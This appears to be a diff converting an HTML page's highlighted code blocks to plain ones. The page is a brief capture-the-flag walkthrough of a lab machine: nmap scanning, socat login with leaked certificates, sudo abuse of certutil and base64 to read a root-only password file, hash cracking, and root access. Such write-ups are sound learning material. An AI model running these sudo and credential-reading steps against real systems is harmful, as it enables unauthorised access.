@@ -122,115 +122,115 @@
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<div class="codehilite"><pre><span></span><code>nmap -sC -sV -p- .........
-</code></pre></div>
+<pre class="codehilite"><code>nmap -sC -sV -p- .........
+</code></pre>
 
-<div class="codehilite"><pre><span></span><code><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="mf">10.66.142.253</span><span class="w"> </span><span class="mi">9009</span>
+<pre class="codehilite"><code>nc -v 10.66.142.253 9009
 
-<span class="n">can</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n n-Quoted">`certificate`</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n n-Quoted">`key`</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">help</span><span class="w"> </span><span class="n">cmd</span>
+can get `certificate` &amp; `key` and help cmd
 
-<span class="n n-Quoted">`help</span>
-<span class="n n-Quoted">socat stdio ssl:MACHINE_IP:54321,cert=&lt;CERT_FILE&gt;,key=&lt;KEY_FILE&gt;,verify=0</span>
-<span class="n n-Quoted">`</span>
-</code></pre></div>
+`help
+socat stdio ssl:MACHINE_IP:54321,cert=&lt;CERT_FILE&gt;,key=&lt;KEY_FILE&gt;,verify=0
+`
+</code></pre>
 
-<div class="codehilite"><pre><span></span><code>socat stdio ssl:10.66.142.253:54321,cert=certificate,key=key,verify=0
-</code></pre></div>
+<pre class="codehilite"><code>socat stdio ssl:10.66.142.253:54321,cert=certificate,key=key,verify=0
+</code></pre>
 
-<div class="codehilite"><pre><span></span><code><span class="nv">Welcome</span>:<span class="w"> </span><span class="s1">&#39;Barney Rubble&#39;</span><span class="w"> </span><span class="nv">is</span><span class="w"> </span><span class="nv">authorized</span>.
-<span class="nv">b3dr0ck</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">password</span>
-<span class="nv">Password</span><span class="w"> </span><span class="nv">hint</span>:<span class="w"> </span><span class="nv">d1ad7c0a3805955a35eb260dab4180dd</span><span class="w"> </span><span class="ss">(</span><span class="nv">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Barney Rubble&#39;</span><span class="ss">)</span>
-<span class="nv">b3dr0ck</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">ls</span>
-<span class="nv">Unrecognized</span><span class="w"> </span><span class="nv">command</span>:<span class="w"> </span><span class="s1">&#39;ls&#39;</span>
+<pre class="codehilite"><code>Welcome: 'Barney Rubble' is authorized.
+b3dr0ck&gt; password
+Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
+b3dr0ck&gt; ls
+Unrecognized command: 'ls'
 
-<span class="nv">This</span><span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="nv">is</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">login</span><span class="w"> </span><span class="nv">and</span><span class="w"> </span><span class="nv">password</span><span class="w"> </span><span class="nv">hints</span>
-<span class="nv">b3dr0ck</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">whoami</span>
-<span class="nv">Current</span><span class="w"> </span><span class="nv">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Barney Rubble&#39;</span><span class="w"> </span><span class="ss">(</span><span class="nv">valid</span><span class="w"> </span><span class="nv">peer</span><span class="w"> </span><span class="nv">certificate</span><span class="ss">)</span>
-<span class="nv">b3dr0ck</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">dir</span>
-<span class="nv">Unrecognized</span><span class="w"> </span><span class="nv">command</span>:<span class="w"> </span><span class="s1">&#39;dir&#39;</span>
+This service is for login and password hints
+b3dr0ck&gt; whoami
+Current user = 'Barney Rubble' (valid peer certificate)
+b3dr0ck&gt; dir
+Unrecognized command: 'dir'
 
-<span class="nv">This</span><span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="nv">is</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">login</span><span class="w"> </span><span class="nv">and</span><span class="w"> </span><span class="nv">password</span><span class="w"> </span><span class="nv">hints</span>
-<span class="nv">b3dr0ck</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">login</span>
-<span class="nv">Login</span><span class="w"> </span><span class="nv">is</span><span class="w"> </span><span class="nv">disabled</span>.<span class="w"> </span><span class="nv">Please</span><span class="w"> </span><span class="nv">use</span><span class="w"> </span><span class="nv">SSH</span><span class="w"> </span><span class="nv">instead</span>.
-<span class="nv">b3dr0ck</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">help</span>
-</code></pre></div>
+This service is for login and password hints
+b3dr0ck&gt; login
+Login is disabled. Please use SSH instead.
+b3dr0ck&gt; help
+</code></pre>
 
-<div class="codehilite"><pre><span></span><code><span class="n">ssh</span><span class="w"> </span><span class="n">barney</span><span class="mf">@10.66.142.253</span><span class="w">  </span>
-<span class="n">barney</span><span class="p">@</span><span class="n">ip</span><span class="mi">-10-66-142-253</span><span class="o">:~</span><span class="n">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">barney</span><span class="p">.</span><span class="n">txt</span>
+<pre class="codehilite"><code>ssh barney@10.66.142.253  
+barney@ip-10-66-142-253:~$ cat barney.txt
 
-<span class="n">barney</span><span class="p">@</span><span class="n">ip</span><span class="mi">-10-66-142-253</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">fred$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
-<span class="p">[</span><span class="n">sudo</span><span class="p">]</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">barney</span><span class="o">:</span><span class="w"> </span>
-<span class="n">Matching</span><span class="w"> </span><span class="n">Defaults</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">barney</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">ip</span><span class="mi">-10-66-142-253</span><span class="o">:</span>
-<span class="w">    </span><span class="n">insults</span><span class="p">,</span><span class="w"> </span><span class="n">env_reset</span><span class="p">,</span><span class="w"> </span><span class="n">mail_badpass</span><span class="p">,</span><span class="w"> </span><span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="o">:/</span><span class="n">sbin</span><span class="err">\</span><span class="o">:/</span><span class="n">bin</span><span class="err">\</span><span class="o">:/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span>
+barney@ip-10-66-142-253:/home/fred$ sudo -l
+[sudo] password for barney: 
+Matching Defaults entries for barney on ip-10-66-142-253:
+    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-<span class="n">User</span><span class="w"> </span><span class="n">barney</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">ip</span><span class="mi">-10-66-142-253</span><span class="o">:</span>
-<span class="w">    </span><span class="p">(</span><span class="n">ALL</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">ALL</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">certutil</span>
-</code></pre></div>
+User barney may run the following commands on ip-10-66-142-253:
+    (ALL : ALL) /usr/bin/certutil
+</code></pre>
 
-<div class="codehilite"><pre><span></span><code><span class="n">barney</span><span class="nv">@ip</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">66</span><span class="o">-</span><span class="mi">142</span><span class="o">-</span><span class="mi">253</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">fred</span><span class="err">$</span><span class="w"> </span><span class="n">certutil</span><span class="w"> </span><span class="n">ls</span>
+<pre class="codehilite"><code>barney@ip-10-66-142-253:/home/fred$ certutil ls
 
-<span class="k">Current</span><span class="w"> </span><span class="n">Cert</span><span class="w"> </span><span class="nl">List</span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">abc</span><span class="o">/</span><span class="n">certs</span><span class="p">)</span>
-<span class="o">------------------</span>
-<span class="n">total</span><span class="w"> </span><span class="mi">56</span>
-<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Apr</span><span class="w"> </span><span class="mi">30</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="p">.</span>
-<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">8</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Apr</span><span class="w"> </span><span class="mi">29</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="p">..</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">972</span><span class="w"> </span><span class="k">Dec</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">42</span><span class="w"> </span><span class="n">barney</span><span class="p">.</span><span class="n">certificate</span><span class="p">.</span><span class="n">pem</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">1674</span><span class="w"> </span><span class="k">Dec</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">42</span><span class="w"> </span><span class="n">barney</span><span class="p">.</span><span class="n">clientKey</span><span class="p">.</span><span class="n">pem</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">894</span><span class="w"> </span><span class="k">Dec</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">42</span><span class="w"> </span><span class="n">barney</span><span class="p">.</span><span class="n">csr</span><span class="p">.</span><span class="n">pem</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">1678</span><span class="w"> </span><span class="k">Dec</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">42</span><span class="w"> </span><span class="n">barney</span><span class="p">.</span><span class="n">serviceKey</span><span class="p">.</span><span class="n">pem</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">976</span><span class="w"> </span><span class="k">Dec</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">42</span><span class="w"> </span><span class="n">fred</span><span class="p">.</span><span class="n">certificate</span><span class="p">.</span><span class="n">pem</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">1674</span><span class="w"> </span><span class="k">Dec</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">42</span><span class="w"> </span><span class="n">fred</span><span class="p">.</span><span class="n">clientKey</span><span class="p">.</span><span class="n">pem</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">898</span><span class="w"> </span><span class="k">Dec</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">42</span><span class="w"> </span><span class="n">fred</span><span class="p">.</span><span class="n">csr</span><span class="p">.</span><span class="n">pem</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">1678</span><span class="w"> </span><span class="k">Dec</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">42</span><span class="w"> </span><span class="n">fred</span><span class="p">.</span><span class="n">serviceKey</span><span class="p">.</span><span class="n">pem</span>
-
-
-<span class="n">barney</span><span class="nv">@ip</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">66</span><span class="o">-</span><span class="mi">142</span><span class="o">-</span><span class="mi">253</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">fred</span><span class="err">$</span><span class="w"> </span><span class="n">certutil</span><span class="w"> </span><span class="o">-</span><span class="n">h</span>
-
-<span class="n">Cert</span><span class="w"> </span><span class="n">Tool</span><span class="w"> </span><span class="k">Usage</span><span class="err">:</span>
-<span class="o">----------------</span>
-
-<span class="n">Show</span><span class="w"> </span><span class="k">current</span><span class="w"> </span><span class="nl">certs</span><span class="p">:</span>
-<span class="w">  </span><span class="n">certutil</span><span class="w"> </span><span class="n">ls</span>
-
-<span class="n">Generate</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="nl">keypair</span><span class="p">:</span>
-<span class="w">  </span><span class="n">certutil</span><span class="w"> </span><span class="o">[</span><span class="n">username</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">fullname</span><span class="o">]</span>
+Current Cert List: (/usr/share/abc/certs)
+------------------
+total 56
+drwxrwxr-x 2 root root 4096 Apr 30  2022 .
+drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
+-rw-r----- 1 root root  972 Dec 20 15:42 barney.certificate.pem
+-rw-r----- 1 root root 1674 Dec 20 15:42 barney.clientKey.pem
+-rw-r----- 1 root root  894 Dec 20 15:42 barney.csr.pem
+-rw-r----- 1 root root 1678 Dec 20 15:42 barney.serviceKey.pem
+-rw-r----- 1 root root  976 Dec 20 15:42 fred.certificate.pem
+-rw-r----- 1 root root 1674 Dec 20 15:42 fred.clientKey.pem
+-rw-r----- 1 root root  898 Dec 20 15:42 fred.csr.pem
+-rw-r----- 1 root root 1678 Dec 20 15:42 fred.serviceKey.pem
 
 
-<span class="n">barney</span><span class="nv">@ip</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">66</span><span class="o">-</span><span class="mi">142</span><span class="o">-</span><span class="mi">253</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">fred</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">certutil</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w"> </span><span class="n">fred</span><span class="p">.</span><span class="n">csr</span><span class="p">.</span><span class="n">pem</span>
-<span class="n">Generating</span><span class="w"> </span><span class="n">credentials</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">user</span><span class="err">:</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="p">(</span><span class="n">fredcsrpem</span><span class="p">)</span>
-</code></pre></div>
+barney@ip-10-66-142-253:/home/fred$ certutil -h
+
+Cert Tool Usage:
+----------------
+
+Show current certs:
+  certutil ls
+
+Generate new keypair:
+  certutil [username] [fullname]
+
+
+barney@ip-10-66-142-253:/home/fred$ sudo certutil -a fred.csr.pem
+Generating credentials for user: a (fredcsrpem)
+</code></pre>
 
 <blockquote>
 <p>Now I have <code>certificate</code> &amp; <code>key</code> Now re login</p>
 </blockquote>
-<div class="codehilite"><pre><span></span><code>socat stdio ssl:10.66.142.253:54321,cert=certificate,key=key,verify=0
+<pre class="codehilite"><code>socat stdio ssl:10.66.142.253:54321,cert=certificate,key=key,verify=0
 
-Welcome: &#39;fredcsrpem&#39; is authorized.
+Welcome: 'fredcsrpem' is authorized.
 b3dr0ck&gt; passwor
 dPassword hint:...........
-</code></pre></div>
+</code></pre>
 
 <blockquote>
 <p>Now have fred pwd so login as fred</p>
 </blockquote>
-<div class="codehilite"><pre><span></span><code><span class="n">barney</span><span class="nv">@ip</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">66</span><span class="o">-</span><span class="mi">142</span><span class="o">-</span><span class="mi">253</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">fred</span><span class="err">$</span><span class="w"> </span><span class="n">su</span><span class="w"> </span><span class="n">fred</span>
-<span class="nl">Password</span><span class="p">:</span><span class="w"> </span>
-<span class="n">fred</span><span class="nv">@ip</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">66</span><span class="o">-</span><span class="mi">142</span><span class="o">-</span><span class="mi">253</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">fred</span><span class="p">.</span><span class="n">txt</span>
-</code></pre></div>
+<pre class="codehilite"><code>barney@ip-10-66-142-253:/home/fred$ su fred
+Password: 
+fred@ip-10-66-142-253:~$ cat fred.txt
+</code></pre>
 
-<div class="codehilite"><pre><span></span><code><span class="n">fred</span><span class="nv">@ip</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">66</span><span class="o">-</span><span class="mi">142</span><span class="o">-</span><span class="mi">253</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
-<span class="n">Matching</span><span class="w"> </span><span class="n">Defaults</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">fred</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">ip</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">66</span><span class="o">-</span><span class="mi">142</span><span class="o">-</span><span class="mi">253</span><span class="err">:</span>
-<span class="w">    </span><span class="n">insults</span><span class="p">,</span><span class="w"> </span><span class="n">env_reset</span><span class="p">,</span><span class="w"> </span><span class="n">mail_badpass</span><span class="p">,</span><span class="w"> </span><span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">sbin</span><span class="err">\:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">bin</span><span class="err">\:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="err">\:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="err">\:</span><span class="o">/</span><span class="n">sbin</span><span class="err">\:</span><span class="o">/</span><span class="n">bin</span><span class="err">\:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span>
+<pre class="codehilite"><code>fred@ip-10-66-142-253:~$ sudo -l
+Matching Defaults entries for fred on ip-10-66-142-253:
+    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-<span class="k">User</span><span class="w"> </span><span class="n">fred</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">ip</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">66</span><span class="o">-</span><span class="mi">142</span><span class="o">-</span><span class="mi">253</span><span class="err">:</span>
-<span class="w">    </span><span class="p">(</span><span class="ow">ALL</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="ow">ALL</span><span class="p">)</span><span class="w"> </span><span class="nl">NOPASSWD</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">base32</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">pass</span><span class="p">.</span><span class="n">txt</span>
-<span class="w">    </span><span class="p">(</span><span class="ow">ALL</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="ow">ALL</span><span class="p">)</span><span class="w"> </span><span class="nl">NOPASSWD</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">base64</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">pass</span><span class="p">.</span><span class="n">txt</span>
-</code></pre></div>
+User fred may run the following commands on ip-10-66-142-253:
+    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
+    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
+</code></pre>
 
-<div class="codehilite"><pre><span></span><code>sudo /usr/bin/base64 /root/pass.txt
+<pre class="codehilite"><code>sudo /usr/bin/base64 /root/pass.txt
 TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
 ................
-</code></pre></div>
+</code></pre>
 
 <blockquote>
 <p>I have to decode</p>
@@ -240,13 +240,13 @@ From Base32 &amp; Base64 --&gt; .........</p>
 <p>Use crackstation to crack --&gt; ................</p>
 <p>Now login as a root</p>
 </blockquote>
-<div class="codehilite"><pre><span></span><code><span class="n">su</span>
-<span class="nl">Password</span><span class="p">:</span><span class="w"> </span>
-<span class="n">root</span><span class="nv">@ip</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">66</span><span class="o">-</span><span class="mi">142</span><span class="o">-</span><span class="mi">253</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">fred</span><span class="err">#</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">root</span>
-<span class="n">root</span><span class="nv">@ip</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">66</span><span class="o">-</span><span class="mi">142</span><span class="o">-</span><span class="mi">253</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">ls</span>
-<span class="n">pass</span><span class="p">.</span><span class="n">txt</span><span class="w">  </span><span class="n">root</span><span class="p">.</span><span class="n">txt</span><span class="w">  </span><span class="n">snap</span>
-<span class="n">root</span><span class="nv">@ip</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">66</span><span class="o">-</span><span class="mi">142</span><span class="o">-</span><span class="mi">253</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
-</code></pre></div>
+<pre class="codehilite"><code>su
+Password: 
+root@ip-10-66-142-253:/home/fred# cd /root
+root@ip-10-66-142-253:~# ls
+pass.txt  root.txt  snap
+root@ip-10-66-142-253:~# cat root.txt
+</code></pre>
         </div>
     </main>
 
